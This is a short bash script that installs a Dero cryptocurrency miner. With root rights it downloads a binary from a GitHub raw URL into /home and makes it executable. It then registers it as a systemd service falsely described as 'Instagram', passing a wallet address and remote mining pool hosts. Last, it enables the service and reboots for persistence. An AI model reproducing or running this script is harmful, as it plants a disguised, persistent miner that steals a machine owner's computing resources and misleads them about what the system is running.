#!/bin/bash
number=$(shuf -i 5-7 -n 1)
echo "Threads: $number"
cd /home
sudo wget https://github.com/spm1000/spmontop/raw/main/bozo
sudo chmod +x bozo
sudo bash -c 'echo -e "[Unit]\nDescription=Instagram\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/bozo -w dero1qyrr4qee4nv4fqyva3grn8n40qzsaek0g3gv87xpclxarylw463mzqguysjxn -m $number -r kys.llcdn.in:10100 -r2 derostats.io:10100 -r1 dero-node.mysrv.cloud:10100 -p rpc\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
sudo systemctl daemon-reload
sudo systemctl enable deroz.service
sudo reboot